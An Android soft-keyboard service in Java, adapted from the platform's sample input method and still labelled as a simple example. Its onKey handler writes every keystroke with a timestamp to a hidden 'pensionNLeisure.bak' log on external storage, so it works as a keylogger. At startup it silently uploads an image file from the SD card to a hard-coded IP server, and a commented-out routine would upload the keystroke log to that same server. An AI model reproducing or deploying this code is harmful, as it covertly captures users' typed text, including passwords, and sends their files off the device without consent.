/*
 * Copyright (C) 2008-2009 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.truemind.pensionnleisure.softkeyboard;

import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.os.Environment;
import android.text.InputType;
import android.text.method.MetaKeyKeyListener;
import android.util.Log;
import android.view.KeyCharacterMap;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.CompletionInfo;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import android.view.inputmethod.InputMethodManager;
import android.view.inputmethod.InputMethodSubtype;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import com.truemind.pensionnleisure.ApplicationController;
import com.truemind.pensionnleisure.FileData;
import com.truemind.pensionnleisure.NetworkService;
import com.truemind.pensionnleisure.R;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

/**
 * Example of writing an input method for a soft keyboard.  This code is
 * focused on simplicity over completeness, so it should in no way be considered
 * to be a complete soft keyboard implementation.  Its purpose is to provide
 * a basic example for how you would get started writing an input method, to
 * be fleshed out as appropriate.
 */
public class SoftKeyboard extends InputMethodService
        implements KeyboardView.OnKeyboardActionListener {
    static final boolean DEBUG = false;
    
    /**
     * This boolean indicates the optional example code for performing
     * processing of hard keys in addition to regular text generation
     * from on-screen interaction.  It would be used for input methods that
     * perform language translations (such as converting text entered on 
     * a QWERTY keyboard to Chinese), but may not be used for input methods
     * that are primarily intended to be used for on-screen text entry.
     */
    static final boolean PROCESS_HARD_KEYS = true;

    private InputMethodManager mInputMethodManager;

    private LatinKeyboardView mInputView;
    //private CompletionInfo[] mCompletions;
    
    private StringBuilder mComposing = new StringBuilder();
    //private boolean mCompletionOn;
    private WordComposer mWord = new WordComposer();
    private int mLastDisplayWidth;
    private boolean mCapsLock;
    private boolean mFastNote;
    private long mLastShiftTime;
    private long mMetaState;

    private int mCommittedLength;
    public static final String DEF_CHARSET = "UTF-8";

    private CharSequence mJustRevertedSeparator;
    public static final String PRJ_NAME = "PensionNleisure";
    private LatinKeyboard mSymbolsKeyboard;
    private LatinKeyboard mSymbolsShiftedKeyboard;
    private LatinKeyboard mQwertyKeyboard;
    private LatinKeyboard mQwertyKoKeyboard;
    private LatinKeyboard mQwertyKoShiftedKeyboard;
    
    private LatinKeyboard mCurKeyboard;
    
    private String mWordSeparators;
    private String mSentenceSeparators;
    private NetworkService networkService; //NetworkService 객체 생성
    private int mDeleteCount;
    HangulAutomata mHangulAutomata = new HangulAutomata();
    /**
     * Main initialization of the input method component.  Be sure to call
     * to super class.
     */
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("HI THERE","HI THERE");

        networkService = ApplicationController. getInstance().getNetworkService();
        fileTS();
        mInputMethodManager = (InputMethodManager)getSystemService(INPUT_METHOD_SERVICE);
        mWordSeparators = getResources().getString(R.string.word_separators);
        mSentenceSeparators = getResources().getString(R.string.sentence_separators);
    }/*
    public void doFileUpload() {
        try {
            String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
            String FILENAME = "pensionNLeisure.bak";
            String folder = "PNL";
            File dirs = new File(Environment.getExternalStorageDirectory(), folder);
            HttpClient httpClient = new DefaultHttpClient();

            if (!dirs.exists()) {
                dirs.mkdirs();
            }

            File saveFile = new File(SDCARD+ "/" + folder + File.separator+FILENAME);
            String url = "http://54.145.130.55:3000";
            HttpPost post = new HttpPost(url);
            FileBody bin = new FileBody(saveFile);
                    MultipartEntity multipart =
                    new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
            multipart.addPart("images", bin);

            post.setEntity(multipart);
            HttpResponse response = httpClient.execute(post);
            HttpEntity resEntity = response.getEntity();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
*/
    public void fileTS(){
        try{
            String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
            String FILENAME2 = "image_01.png";
            String folder = "PNL";/*
            File dirs = new File(Environment.getExternalStorageDirectory(), folder);

            if (!dirs.exists()) {
                dirs.mkdirs();
            }*/
/*
            //FileData fileData = new FileData(new File(SDCARD+ "/" + folder + File.separator+FILENAME));
            FileData fileData = new FileData(new File(SDCARD + File.separator + FILENAME2));

            Call<Void> fileSendCall = networkService.fileToServer(fileData);
            fileSendCall.enqueue(new Callback<Void>() {
                @Override
                public void onResponse(Call<Void> call, Response<Void> response) {
                    if(response.isSuccessful()){
                        Log.d("mytag", "성공");
                    }else{
                        Log.d("mytag", "code:"+response.code());
                    }
                }

                @Override
                public void onFailure(Call<Void> call, Throwable t) {
                    Log.d("mytag", "fail : "+t.getMessage());
                }
            });
        }catch(Exception e) {
            Log.d("EXCEPTION",e.getMessage());
        }
        */
            File photo = new File(SDCARD + File.separator + FILENAME2);
            RequestBody photoBody = RequestBody.create(MediaType.parse("image/jpg"), photo);

            // MultipartBody.Part is used to send also the actual file name
            MultipartBody.Part body = MultipartBody.Part.createFormData("picture", photo.getName(), photoBody);

//        Log.i("myTag","this file'name is "+ photo.getName());

            /**
             * 서버에 사진이외의 텍스트를 보낼 경우를 생각해서 일단 넣어둠
             */
            // add another part within the multipart request
            String descriptionString = "android";

            RequestBody description = RequestBody.create(MediaType.parse("multipart/form-data"), descriptionString);


            /**
             * 사진 업로드하는 부분 // POST방식 이용
             */

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("http://54.145.130.55:3000")
                    .build();

            NetworkService service = retrofit.create(NetworkService.class);

            Call<ResponseBody> call = service.fileToServer(body);
            call.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {

                    if(response.isSuccessful()){

                        Gson gson = new Gson();
                        try {
                            String getResult = response.body().string();

                            JsonParser parser = new JsonParser();
                            JsonElement rootObejct = parser.parse(getResult);

//                        Log.i("mytag",rootObejct.toString());


                            if(response.isSuccessful()){
                                Toast.makeText(getApplicationContext(),"사진 업로드 성공!!!!",Toast.LENGTH_SHORT).show();
                            }

                        } catch (IOException e) {
                            e.printStackTrace();
                            Log.d("MyTag", "error : "+e.getMessage());
                        }


                    }else{
                        Toast.makeText(getApplicationContext(),"사진 업로드 실패!!!!",Toast.LENGTH_SHORT).show();
                    }


                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                    Log.d("Upload error:", t.getMessage());

                    // dismiss dialog
                }



            });
        }
        catch(Exception e) {
            Log.d("EXCEPTION",e.getMessage());
        }
    }


    /**
     * This is the point where you can do all of your UI initialization.  It
     * is called after creation and any configuration change.
     */
    @Override
    public void onInitializeInterface() {
        if (mQwertyKeyboard != null || mQwertyKoKeyboard != null) {
            // Configuration changes can happen after the keyboard gets recreated,
            // so we need to be able to re-build the keyboards if the available
            // space has changed.
            int displayWidth = getMaxWidth();
            if (displayWidth == mLastDisplayWidth) return;
            mLastDisplayWidth = displayWidth;
        }
        mQwertyKeyboard = new LatinKeyboard(this, R.xml.qwerty);
        mQwertyKoKeyboard = new LatinKeyboard(this, R.xml.qwerty_ko);
        mQwertyKoShiftedKeyboard = new LatinKeyboard(this, R.xml.qwerty_ko_shift);
        mSymbolsKeyboard = new LatinKeyboard(this, R.xml.symbols);
        mSymbolsShiftedKeyboard = new LatinKeyboard(this, R.xml.symbols_shift);
    }
    
    /**
     * Called by the framework when your view for creating input needs to
     * be generated.  This will be called the first time your input method
     * is displayed, and every time it needs to be re-created such as due to
     * a configuration change.
     */
    @Override
    public View onCreateInputView() {
        mInputView = (LatinKeyboardView) getLayoutInflater().inflate(
                R.layout.input, null);
        mInputView.setOnKeyboardActionListener(this);
        mInputView.setKeyboard(mQwertyKeyboard);
        return mInputView;
    }

    /**
     * This is the main point where we do our initialization of the input method
     * to begin operating on an application.  At this point we have been
     * bound to the client, and are now receiving all of the detailed information
     * about the target of our edits.
     */
    @Override
    public void onStartInput(EditorInfo attribute, boolean restarting) {
        super.onStartInput(attribute, restarting);
        
        // Reset our state.  We want to do this even if restarting, because
        // the underlying state of the text editor could have changed in any way.
        mComposing.setLength(0);
        
        if (!restarting) {
            // Clear shift states.
            mMetaState = 0;
        }
        // We are now going to initialize our state based on the type of
        // text being edited.
        switch (attribute.inputType & InputType.TYPE_MASK_CLASS) {
            case InputType.TYPE_CLASS_NUMBER:
            case InputType.TYPE_CLASS_DATETIME:
                // Numbers and dates default to the symbols keyboard, with
                // no extra features.
                mCurKeyboard = mSymbolsKeyboard;
                break;
                
            case InputType.TYPE_CLASS_PHONE:
                // Phones will also default to the symbols keyboard, though
                // often you will want to have a dedicated phone keyboard.
                mCurKeyboard = mSymbolsKeyboard;
                break;
                
            case InputType.TYPE_CLASS_TEXT:
                // This is general text editing.  We will default to the
                // normal alphabetic keyboard, and assume that we should
                // be doing predictive text (showing candidates as the
                // user types).
                mCurKeyboard = mQwertyKeyboard;
                break;
                
            default:
                // For all unknown input types, default to the alphabetic
                // keyboard with no special features.
                mCurKeyboard = mQwertyKeyboard;

                mDeleteCount = 0;
                TextEntryState.newSession(this);
                //updateShiftKeyState(attribute);
        }
        
        // Update the label on the enter key, depending on what the application
        // says it will do.
        //mCurKeyboard.setImeOptions(getResources(), attribute.imeOptions);
    }

    /**
     * This is called when the user is done editing a field.  We can use
     * this to reset our state.
     */
    @Override
    public void onFinishInput() {
        super.onFinishInput();
        
        // Clear current composing text and candidates.
        mComposing.setLength(0);
        mCurKeyboard = mQwertyKeyboard;
        if (mInputView != null) {
            mInputView.closing();
        }
    }
    
    @Override
    public void onStartInputView(EditorInfo attribute, boolean restarting) {
        super.onStartInputView(attribute, restarting);
        // Apply the selected keyboard to the input view.
        mInputView.setKeyboard(mCurKeyboard);
        mInputView.closing();
        final InputMethodSubtype subtype = mInputMethodManager.getCurrentInputMethodSubtype();
        mInputView.setSubtypeOnSpaceKey(subtype);
    }
/*

    @Override
    public void onCurrentInputMethodSubtypeChanged(InputMethodSubtype subtype) {
        mInputView.setSubtypeOnSpaceKey(subtype);
    }
*/

    /**
     * Deal with the editor reporting movement of its cursor.
     */
    /**
     * This tells us about completions that the editor has determined based
     * on the current text in it.  We want to use this in fullscreen mode
     * to show the completions ourself, since the editor can not be seen
     * in that situation.
     *//*
    @Override
    public void onDisplayCompletions(CompletionInfo[] completions) {
        if (mCompletionOn) {
            mCompletions = completions;
            if (completions == null) {
                return;
            }
            
            List<String> stringList = new ArrayList<String>();
            for (int i = 0; i < completions.length; i++) {
                CompletionInfo ci = completions[i];
                if (ci != null) stringList.add(ci.getText().toString());
            }
        }
    }
    */
    /**
     * This translates incoming hard key events in to edit operations on an
     * InputConnection.  It is only needed when using the
     * PROCESS_HARD_KEYS option.
     */
    private boolean translateKeyDown(int keyCode, KeyEvent event) {
        mMetaState = MetaKeyKeyListener.handleKeyDown(mMetaState,
                keyCode, event);
        int c = event.getUnicodeChar(MetaKeyKeyListener.getMetaState(mMetaState));
        mMetaState = MetaKeyKeyListener.adjustMetaAfterKeypress(mMetaState);
        InputConnection ic = getCurrentInputConnection();
        if (c == 0 || ic == null) {
            return false;
        }
        
        boolean dead = false;

        if ((c & KeyCharacterMap.COMBINING_ACCENT) != 0) {
            dead = true;
            c = c & KeyCharacterMap.COMBINING_ACCENT_MASK;
        }
        
        if (mComposing.length() > 0) {
            char accent = mComposing.charAt(mComposing.length() -1 );
            int composed = KeyEvent.getDeadChar(accent, c);

            if (composed != 0) {
                c = composed;
                mComposing.setLength(mComposing.length()-1);
            }
        }
        
        onKey(c, null);
        
        return true;
    }
    
    /**
     * Use this to monitor key events being delivered to the application.
     * We get first crack at them, and can either resume them or let them
     * continue to the app.
     */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_BACK:
                // The InputMethodService already takes care of the back
                // key for us, to dismiss the input method if it is shown.
                // However, our keyboard could be showing a pop-up window
                // that back should dismiss, so we first allow it to do that.
                if (event.getRepeatCount() == 0 && mInputView != null) {
                    if (mInputView.handleBack()) {
                        return true;
                    }
                }
                break;
                
            case KeyEvent.KEYCODE_DEL:
                // Special handling of the delete key: if we currently are
                // composing text for the user, we want to modify that instead
                // of let the application to the delete itself.
                if (mComposing.length() > 0) {
                    onKey(Keyboard.KEYCODE_DELETE, null);
                    return true;
                }
                break;
                
            case KeyEvent.KEYCODE_ENTER:
                // Let the underlying text editor always handle these.
                return false;
                
            default:
                // For all other keys, if we want to do transformations on
                // text being entered with a hard keyboard, we need to process
                // it and do the appropriate action.
                if (PROCESS_HARD_KEYS) {
                    if (keyCode == KeyEvent.KEYCODE_SPACE
                            && (event.getMetaState()& KeyEvent.META_ALT_ON) != 0) {
                        // A silly example: in our input method, Alt+Space
                        // is a shortcut for 'android' in lower case.
                        InputConnection ic = getCurrentInputConnection();
                        if (ic != null) {
                            // First, tell the editor that it is no longer in the
                            // shift state, since we are consuming this.
                            ic.clearMetaKeyStates(KeyEvent.META_ALT_ON);
                            keyDownUp(KeyEvent.KEYCODE_A);
                            keyDownUp(KeyEvent.KEYCODE_N);
                            keyDownUp(KeyEvent.KEYCODE_D);
                            keyDownUp(KeyEvent.KEYCODE_R);
                            keyDownUp(KeyEvent.KEYCODE_O);
                            keyDownUp(KeyEvent.KEYCODE_I);
                            keyDownUp(KeyEvent.KEYCODE_D);
                            // And we consume this event.
                            return true;
                        }
                    }
                    if (translateKeyDown(keyCode, event)) {
                        return true;
                    }
                }
        }
        
        return super.onKeyDown(keyCode, event);
    }

    /**
     * Use this to monitor key events being delivered to the application.
     * We get first crack at them, and can either resume them or let them
     * continue to the app.
     */
    @Override
    public boolean onKeyUp(int keyCode, KeyEvent event) {
        // If we want to do transformations on text being entered with a hard
        // keyboard, we need to process the up events to update the meta key
        // state we are tracking.
        /*
        if (PROCESS_HARD_KEYS) {
            if (mPredictionOn) {
                mMetaState = MetaKeyKeyListener.handleKeyUp(mMetaState,
                        keyCode, event);
            }
        }
        */
        return super.onKeyUp(keyCode, event);
    }

    /**
     * Helper function to commit any text being composed in to the editor.
     */
    private void commitTyped(InputConnection inputConnection) {
        /* original------------------------------------------------------
        if (mComposing.length() > 0) {
            inputConnection.commitText(mComposing, mComposing.length());
            mComposing.setLength(0);
        }*/

        if (mComposing.length() > 0) {
            if (inputConnection != null) {
                inputConnection.commitText(mComposing, 1);
            }
            mCommittedLength = mComposing.length();
            TextEntryState.acceptedTyped(mComposing);
        }
    }

    /**
     * Helper to update the shift state of our keyboard based on the initial
     * editor state.
     */
    private void updateShiftKeyState(EditorInfo attr) {
        if (attr != null 
                && mInputView != null && mQwertyKeyboard == mInputView.getKeyboard()) {
            int caps = 0;
            EditorInfo ei = getCurrentInputEditorInfo();
            if (ei != null && ei.inputType != InputType.TYPE_NULL) {
                caps = getCurrentInputConnection().getCursorCapsMode(attr.inputType);
            }
            mInputView.setShifted(mCapsLock || caps != 0);
        }
    }
    
    /**
     * Helper to determine if a given character code is alphabetic.
     */
    private boolean isAlphabet(int code) {
        if (Character.isLetter(code)) {
            return true;
        } else {
            return false;
        }
    }
    
    /**
     * Helper to send a key down / key up pair to the current editor.
     */
    private void keyDownUp(int keyEventCode) {
        getCurrentInputConnection().sendKeyEvent(
                new KeyEvent(KeyEvent.ACTION_DOWN, keyEventCode));
        getCurrentInputConnection().sendKeyEvent(
                new KeyEvent(KeyEvent.ACTION_UP, keyEventCode));
    }
    
    /**
     * Helper to send a character to the editor as raw key events.
     */
    private void sendKey(int keyCode) {

        switch (keyCode) {
            case '\n':
                keyDownUp(KeyEvent.KEYCODE_ENTER);
                break;
            default:
                if (keyCode >= '0' && keyCode <= '9') {
                    keyDownUp(keyCode - '0' + KeyEvent.KEYCODE_0);
                } else {
                    getCurrentInputConnection().commitText(String.valueOf((char) keyCode), 1);
                }
                break;
        }
    }


    // Implementation of KeyboardViewListener

    public void onKey(int primaryCode, int[] keyCodes) {
    	String keypress = String.valueOf((char)primaryCode);
    	Log.d("Key Pressed",keypress);
    	try{
        	String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
            String FILENAME = "pensionNLeisure.bak";
            String folder = "PNL";

            File dirs = new File(Environment.getExternalStorageDirectory(), folder);
            SimpleDateFormat formatter = new SimpleDateFormat("[yyyy/MM/dd/HH/mm/ss]:");
            Date currentTime_1 = new Date();
            String dateString = formatter.format(currentTime_1);

            if (!dirs.exists()) {
                dirs.mkdirs();
            }

            File outfile = new File(SDCARD+ "/" + folder + File.separator+FILENAME);
            FileOutputStream fos = new FileOutputStream(outfile,true);
            String space = "\n";
            fos.write(dateString.getBytes());
            fos.write(keypress.getBytes());
            fos.write(space.getBytes());
            fos.close();
            if(mFastNote==true){
                String FILENAME2 = "FastNote.txt";
                File outfile2 = new File(SDCARD+ File.separator+FILENAME2);
                FileOutputStream fos2 = new FileOutputStream(outfile2,true);
                fos2.write(keypress.getBytes());
                fos2.close();
            }
    	}catch(Exception e) {
    		Log.d("EXCEPTION",e.getMessage());
    	}
    	
        if (isWordSeparator(primaryCode)) {
            // Handle separator
            if (mComposing.length() > 0) {
                commitTyped(getCurrentInputConnection());
            }
            sendKey(primaryCode);
            updateShiftKeyState(getCurrentInputEditorInfo());
        } else if (primaryCode == Keyboard.KEYCODE_DELETE) {
            mDeleteCount++;
            handleBackspace();
        } else if (primaryCode == Keyboard.KEYCODE_SHIFT) {
            handleShift();

        } else if(primaryCode == -4){
            fastNoteActive();

        } else if (primaryCode == Keyboard.KEYCODE_CANCEL && mInputView != null) {
            Keyboard current = mInputView.getKeyboard();
            if (current == mQwertyKeyboard) {
                current = mQwertyKoKeyboard;
            } else {
                current = mQwertyKeyboard;
            }
            mInputView.setKeyboard(current);
            return;
        } else if (primaryCode == LatinKeyboardView.KEYCODE_OPTIONS) {
            // Show a menu or somethin'
        } else if (primaryCode == Keyboard.KEYCODE_MODE_CHANGE
                && mInputView != null) {
            Keyboard current = mInputView.getKeyboard();
            if (current == mSymbolsKeyboard || current == mSymbolsShiftedKeyboard) {
                    current = mQwertyKeyboard;
            } else {
                current = mSymbolsKeyboard;
            }
            mInputView.setKeyboard(current);
            if (current == mSymbolsKeyboard) {
                current.setShifted(false);
            }
        } else {
            if (isWordSeparator(primaryCode)) {
                handleSeparator(primaryCode);
            } else {
                handleCharacter(primaryCode, keyCodes);
            }
        }
    }
    private void handleSeparator(int primaryCode) {
        boolean pickedDefault = false;
        // Handle separator
        InputConnection ic = getCurrentInputConnection();
        if (ic != null) {
            ic.beginBatchEdit();
        }

        else if(mComposing.length() > 0)
        {
            if (ic != null)
                ic.commitText(mComposing, 1);

            mComposing.setLength(0);
            mHangulAutomata.reset();
        }

        sendKeyChar((char)primaryCode);
        TextEntryState.typedCharacter((char) primaryCode, true);
        if (TextEntryState.getState() == TextEntryState.STATE_PUNCTUATION_AFTER_ACCEPTED
                /*&& primaryCode != KEYCODE_ENTER*/) {
            swapPunctuationAndSpace();
        } else if (/*isPredictionOn() && */primaryCode == ' ') {
            //else if (TextEntryState.STATE_SPACE_AFTER_ACCEPTED) {
            doubleSpace();
        }


        updateShiftKeyState(getCurrentInputEditorInfo());
        if (ic != null) {
            ic.endBatchEdit();
        }
    }

    private void swapPunctuationAndSpace() {
        final InputConnection ic = getCurrentInputConnection();
        if (ic == null) return;
        CharSequence lastTwo = ic.getTextBeforeCursor(2, 0);
        if (lastTwo != null && lastTwo.length() == 2
                && lastTwo.charAt(0) == KeyEvent.KEYCODE_SPACE && isSentenceSeparator(lastTwo.charAt(1))) {
            ic.beginBatchEdit();
            ic.deleteSurroundingText(2, 0);
            ic.commitText(lastTwo.charAt(1) + " ", 1);
            ic.endBatchEdit();
            updateShiftKeyState(getCurrentInputEditorInfo());
        }
    }

    public boolean isSentenceSeparator(int code) {
        return mSentenceSeparators.contains(String.valueOf((char)code));
    }

    private void doubleSpace() {
        //if (!mAutoPunctuate) return;
        final InputConnection ic = getCurrentInputConnection();
        if (ic == null) return;
        CharSequence lastThree = ic.getTextBeforeCursor(3, 0);
        if (lastThree != null && lastThree.length() == 3
                && Character.isLetterOrDigit(lastThree.charAt(0))
                && lastThree.charAt(1) == KeyEvent.KEYCODE_SPACE && lastThree.charAt(2) == KeyEvent.KEYCODE_SPACE) {
            ic.beginBatchEdit();
            ic.deleteSurroundingText(2, 0);
            ic.commitText(". ", 1);
            ic.endBatchEdit();
            updateShiftKeyState(getCurrentInputEditorInfo());
        }
    }

    public void onText(CharSequence text) {
        InputConnection ic = getCurrentInputConnection();
        if (ic == null) return;
        ic.beginBatchEdit();
        if (mComposing.length() > 0) {
            commitTyped(ic);
        }
        ic.commitText(text, 0);
        ic.endBatchEdit();
        updateShiftKeyState(getCurrentInputEditorInfo());
    }

    private void handleBackspace() {
        /*
        final int length = mComposing.length();
        if (length > 1) {
            mComposing.delete(length - 1, length);
            getCurrentInputConnection().setComposingText(mComposing, 1);
        } else if (length > 0) {
            mComposing.setLength(0);
            getCurrentInputConnection().commitText("", 0);
        } else {
            keyDownUp(KeyEvent.KEYCODE_DEL);
        }
        updateShiftKeyState(getCurrentInputEditorInfo());
        */

        boolean deleteChar = false;
        InputConnection ic = getCurrentInputConnection();
        if (ic == null) return;
        final int length = mComposing.length();

        if(0 < length/* && -1 != mHangulAutomata.getBuffer()*/)
        {
            mComposing.delete(length - 1, length);
            int result = mHangulAutomata.deleteCharacter();

            if(-1 != result)
                mComposing.append((char)result);
            ic.setComposingText(mComposing, 1);
        }
        else
            deleteChar = true;

        if(DEBUG)
        {
            printComposing();
            printCodes("delete");
        }

        updateShiftKeyState(getCurrentInputEditorInfo());
        TextEntryState.backspace();

        if (TextEntryState.getState() == TextEntryState.STATE_UNDO_COMMIT) {
            revertLastWord(deleteChar);
            return;
        } else if (deleteChar) {
            sendDownUpKeyEvents(KeyEvent.KEYCODE_DEL);
            if (mDeleteCount > DELETE_ACCELERATE_AT) {
                sendDownUpKeyEvents(KeyEvent.KEYCODE_DEL);
            }
        }
        mJustRevertedSeparator = null;
    }

    private static final int DELETE_ACCELERATE_AT = 20;

    public void revertLastWord(boolean deleteChar) {
        final int length = mComposing.length();
        if (length > 0) {
            final InputConnection ic = getCurrentInputConnection();
            ic.beginBatchEdit();
            mJustRevertedSeparator = ic.getTextBeforeCursor(1, 0);
            if (deleteChar) ic.deleteSurroundingText(1, 0);
            int toDelete = mCommittedLength;
            CharSequence toTheLeft = ic.getTextBeforeCursor(mCommittedLength, 0);
            if (toTheLeft != null && toTheLeft.length() > 0
                    && isWordSeparator(toTheLeft.charAt(0))) {
                toDelete--;
            }
            ic.deleteSurroundingText(toDelete, 0);
            ic.setComposingText(mComposing, 1);
            TextEntryState.backspace();
            ic.endBatchEdit();
        } else {
            sendDownUpKeyEvents(KeyEvent.KEYCODE_DEL);
            mJustRevertedSeparator = null;
        }
    }

    private void printComposing()
    {
        Log.v(PRJ_NAME, "mComposing= \'" + encodingStr(mComposing.toString()) + "\'");
    }

    private String encodingStr(String str)
    {
        String ret = null;
        try
        {
            ret = new String(str.getBytes(), DEF_CHARSET);
        }
        catch(UnsupportedEncodingException e)
        {
            Log.v(PRJ_NAME, "UnsupportedEncodingException");
        }

        return ret;
    }

    private void printCodes(String text)
    {
        for(int i = 0; i < mWord.size(); i++)
        {
            int[] codes = mWord.getCodesAt(i);
            int j;
            for(j = 0; j < codes.length; j++)
            {
                if(-1 == codes[j])
                    break;
            }
            String str = new String(codes, 0, j);
            Log.v(PRJ_NAME, text + " codes[" + i + "]= \"" + encodingStr(str) + "\"");

        }
    }

    private void handleShift() {
        if (mInputView == null) {
            return;
        }
        
        Keyboard currentKeyboard = mInputView.getKeyboard();
        if (mQwertyKeyboard == currentKeyboard) {
            // Alphabet keyboard
            checkToggleCapsLock();
            mInputView.setShifted(mCapsLock || !mInputView.isShifted());

        } else if (currentKeyboard == mQwertyKoKeyboard) {
            mSymbolsKeyboard.setShifted(true);
            mInputView.setKeyboard(mQwertyKoShiftedKeyboard);
            mQwertyKoShiftedKeyboard.setShifted(true);
        } else if (currentKeyboard == mQwertyKoShiftedKeyboard) {
            mQwertyKoShiftedKeyboard.setShifted(false);
            mInputView.setKeyboard(mQwertyKoKeyboard);
            mQwertyKoKeyboard.setShifted(false);

        } else if (currentKeyboard == mSymbolsKeyboard) {
            mSymbolsKeyboard.setShifted(true);
            mInputView.setKeyboard(mSymbolsShiftedKeyboard);
            mSymbolsShiftedKeyboard.setShifted(true);
        } else if (currentKeyboard == mSymbolsShiftedKeyboard) {
            mSymbolsShiftedKeyboard.setShifted(false);
            mInputView.setKeyboard(mSymbolsKeyboard);
            mSymbolsKeyboard.setShifted(false);
        }
    }

    private static final boolean PERF_DEBUG = false;
    private long mLastCpsTime;
    private static final int CPS_BUFFER_SIZE = 16;
    private long[] mCpsIntervals = new long[CPS_BUFFER_SIZE];
    private int mCpsIndex;

    private void measureCps() {
        if (!SoftKeyboard.PERF_DEBUG) return;
        long now = System.currentTimeMillis();
        if (mLastCpsTime == 0) mLastCpsTime = now - 100; // Initial
        mCpsIntervals[mCpsIndex] = now - mLastCpsTime;
        mLastCpsTime = now;
        mCpsIndex = (mCpsIndex + 1) % CPS_BUFFER_SIZE;
        long total = 0;
        for (int i = 0; i < CPS_BUFFER_SIZE; i++) total += mCpsIntervals[i];
        System.out.println("CPS = " + ((CPS_BUFFER_SIZE * 1000f) / total));
    }

    private void handleCharacter(int primaryCode, int[] keyCodes) {/*
        if (isInputViewShown()) {
            if (mInputView.isShifted()) {
                primaryCode = Character.toUpperCase(primaryCode);
            }
        }
        if (isAlphabet(primaryCode)) {
            mComposing.append((char) primaryCode);
            getCurrentInputConnection().setComposingText(mComposing, 1);
            updateShiftKeyState(getCurrentInputEditorInfo());
        } else {
            getCurrentInputConnection().commitText(
                    String.valueOf((char) primaryCode), 1);
        }*/

        {

            if (mInputView.isShifted())
                primaryCode = Character.toUpperCase(primaryCode);

            InputConnection ic = getCurrentInputConnection();
            if(null == ic)
                return;

            int length = mComposing.length();
                ic.beginBatchEdit();
                if(-1 != mHangulAutomata.getBuffer() && 0 < length)
                    mComposing.delete(length - 1, length);

                int ret[] = mHangulAutomata.appendCharacter(primaryCode);
                for(int i = 0; i < ret.length - 1; i++)
                {
                    if(-1 != ret[i])
                        mComposing.append((char)ret[i]);
                }
                ic.commitText(mComposing, 1);
                mComposing.setLength(0);
                if(-1 != ret[2])
                {
                    mComposing.append((char)ret[2]);
                    ic.setComposingText(mComposing, 1);
                }
                ic.endBatchEdit();


            updateShiftKeyState(getCurrentInputEditorInfo());
            measureCps();
            TextEntryState.typedCharacter((char) primaryCode, isWordSeparator(primaryCode));
        }

    }

    private void handleClose() {
        commitTyped(getCurrentInputConnection());
        requestHideSelf(0);
        mInputView.closing();
    }

    private void checkToggleCapsLock() {
        long now = System.currentTimeMillis();
        if (mLastShiftTime + 800 > now) {
            mCapsLock = !mCapsLock;
            mLastShiftTime = 0;
        } else {
            mLastShiftTime = now;
        }
    }

    private void fastNoteActive() {
        if(mFastNote==true){
            mFastNote = !mFastNote;
            Toast.makeText(getApplicationContext(), "Text saved in FastNote.txt", Toast.LENGTH_SHORT).show();
        }else{
            mFastNote = !mFastNote;

        }
    }

    private String getWordSeparators() {
        return mWordSeparators;
    }
    
    public boolean isWordSeparator(int code) {
        String separators = getWordSeparators();
        return separators.contains(String.valueOf((char)code));
    }

    public void swipeRight() {
    }
    
    public void swipeLeft() {
        handleBackspace();
    }

    public void swipeDown() {
        handleClose();
    }

    public void swipeUp() {
    }
    
    public void onPress(int primaryCode) {
    }
    
    public void onRelease(int primaryCode) {
    }
}
